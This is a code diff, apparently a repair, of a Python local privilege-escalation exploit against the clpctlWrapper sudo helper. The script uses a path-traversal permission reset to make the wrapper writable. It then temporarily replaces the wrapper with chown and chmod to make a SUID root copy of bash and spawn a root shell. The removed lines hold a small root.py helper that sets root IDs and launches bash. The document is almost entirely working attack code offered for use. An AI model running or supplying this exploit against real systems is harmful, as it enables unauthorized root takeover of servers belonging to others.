@@ -2,29 +2,27 @@ import os
 import subprocess  
   
 def exec_command(command):  
-process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)  
-output, error = process.communicate()  
+    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)  
+    output, error = process.communicate()  
+    if error:
+        print(f"Error executing command: {error}")
+    return output
   
 def exploit():  
-print('[+] Overriding file to writable')  
-exec_command('sudo /usr/bin/clpctlWrapper system:permissions:reset --files=777 --path=../../../../../../../../../../usr/bin/clpctlWrapper')  
-print('[+] Backup clpctlWrapper into tmp...')  
-exec_command('cp /usr/bin/clpctlWrapper /tmp/clpctlWrapper')  
-print('[+] Replacing clpctlWrapper with cp...')  
-exec_command('cp /bin/bash /tmp/bash')  
-print('[+] Assigning suid to /tmp/bash...')  
-exec_command('cp /bin/chown /usr/bin/clpctlWrapper')  
-exec_command('sudo /usr/bin/clpctlWrapper root:root /tmp/bash')  
-exec_command('cp /bin/chmod /usr/bin/clpctlWrapper')  
-exec_command('sudo /usr/bin/clpctlWrapper 6755 /tmp/bash')  
-exec_command('cp /tmp/clpctlWrapper /usr/bin/clpctlWrapper')  
-print('[+] Popping root shell...')  
-os.system('/tmp/bash -p -c "chown root:root /usr/bin/clpctlWrapper && chmod 0700 /usr/bin/clpctlWrapper && python3 root.py"')  
+    print('[+] Overriding file to writable')  
+    exec_command('sudo /usr/bin/clpctlWrapper system:permissions:reset --files=777 --path=../../../../../../../../../../usr/bin/clpctlWrapper')  
+    print('[+] Backup clpctlWrapper into tmp...')  
+    exec_command('cp /usr/bin/clpctlWrapper /tmp/clpctlWrapper')  
+    print('[+] Replacing clpctlWrapper with cp...')  
+    exec_command('cp /bin/bash /tmp/bash')  
+    print('[+] Assigning suid to /tmp/bash...')  
+    exec_command('cp /bin/chown /usr/bin/clpctlWrapper')  
+    exec_command('sudo /usr/bin/clpctlWrapper root:root /tmp/bash')  # Ensure this command is valid
+    exec_command('cp /bin/chmod /usr/bin/clpctlWrapper')  
+    exec_command('sudo /usr/bin/clpctlWrapper 6755 /tmp/bash')  
+    exec_command('cp /tmp/clpctlWrapper /usr/bin/clpctlWrapper')  
+    print('[+] Popping root shell...')  
+    os.system('/tmp/bash -p -c "chown root:root /usr/bin/clpctlWrapper && chmod 0700 /usr/bin/clpctlWrapper && python3 root.py"')  
   
 if __name__ == '__main__':  
-exploit()  
-  
-# root.py  
-import os  
-os.setreuid(0,0)  
-os.setregid(0,0)os.system('/bin/bash')
+    exploit()  
